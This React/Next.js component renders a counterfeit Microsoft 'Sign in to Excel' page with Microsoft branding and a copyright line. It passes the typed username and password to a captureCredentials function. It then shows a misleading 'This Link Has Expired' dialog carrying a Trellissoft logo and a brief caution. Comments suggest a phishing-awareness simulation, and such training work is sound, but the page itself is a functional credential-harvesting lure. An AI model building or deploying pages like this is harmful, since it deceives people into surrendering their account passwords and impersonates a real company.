'use client';

import { FormEvent, useState } from 'react';
import Image from 'next/image';
import { ShieldX } from 'lucide-react';

import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';
import { PlaceHolderImages } from '@/lib/placeholder-images';
import { captureCredentials } from '@/ai/flows/capture-credentials';

export default function SharePointLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');

  // ------------------------
  // Handle Form Submission
  // ------------------------
  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    try {
      // Simulate secure credential capture
      await captureCredentials({ username, password });
      setShowAlert(true);
    } catch (error) {
      console.error('Error capturing credentials:', error);
      setShowAlert(true); // Show alert for awareness
    }
  };

  return (
    <div className="relative flex items-center justify-center min-h-screen">
      {/* Background Image */}
      {bgImage && (
        <Image
          src={bgImage.imageUrl}
          alt={bgImage.description}
          fill
          priority
          style={{ objectFit: 'cover', pointerEvents: 'none' }}
          className="absolute inset-0 z-0"
        />
      )}

      {/* Login Card */}
      <Card className="w-[380px] bg-white/95 text-center shadow-2xl z-10">
        <CardHeader>
          <CardTitle className="text-2xl text-[#217346] font-semibold">
            Sign in to Excel
          </CardTitle>
        </CardHeader>

        <CardContent>
          <form onSubmit={handleSubmit} autoComplete="off" className="space-y-4">
            <Input
              type="text"
              name="username"
              placeholder="Email or phone"
              required
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full p-3 border-gray-300 rounded-md text-base"
            />

            <Input
              type="password"
              name="password"
              placeholder="Password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 border-gray-300 rounded-md text-base"
            />

            <Button
              type="submit"
              className="w-full p-3 mt-2 bg-[#217346] text-white font-bold rounded-md hover:bg-green-800 transition-colors"
            >
              Sign in
            </Button>
          </form>

          <div className="mt-4 text-xs text-gray-600">
            © Microsoft Corporation
          </div>
        </CardContent>
      </Card>

      {/* Awareness Alert Dialog */}
      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
        <AlertDialogContent className="text-center">
          <AlertDialogHeader>
            {/* ✅ Added Trellissoft Logo */}
            <div className="flex justify-center mb-4">
              <Image
                src="https://trellissoft.ai/wp-content/uploads/2025/03/Trellissoft-logo-with-tagline-4.png"
                alt="Trellissoft Logo"
                width={180}
                height={60}
                className="object-contain"
                priority
              />
            </div>

            <div className="flex justify-center mb-3">
              <ShieldX className="w-14 h-14 text-red-500" />
            </div>

            <AlertDialogTitle className="text-2xl font-semibold text-gray-900">
              This Link Has Expired
            </AlertDialogTitle>
          </AlertDialogHeader>

          <AlertDialogDescription className="mt-2 text-gray-700 leading-relaxed">
            ⚠️ This link has expired for security reasons. <br />
            Your asset update form is no longer available. <br />
            To protect your information, this link automatically expires after a set time.
            <br /><br />
            Please request a new secure link if you still need to update your details.
            <p className="mt-4 text-sm text-gray-500">
              Always be cautious of unexpected login requests.
            </p>
          </AlertDialogDescription>

          <AlertDialogFooter className="sm:justify-center mt-4">
            <AlertDialogAction
              onClick={() => setShowAlert(false)}
              className="bg-[#217346] text-white hover:bg-green-800"
            >
              Continue
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
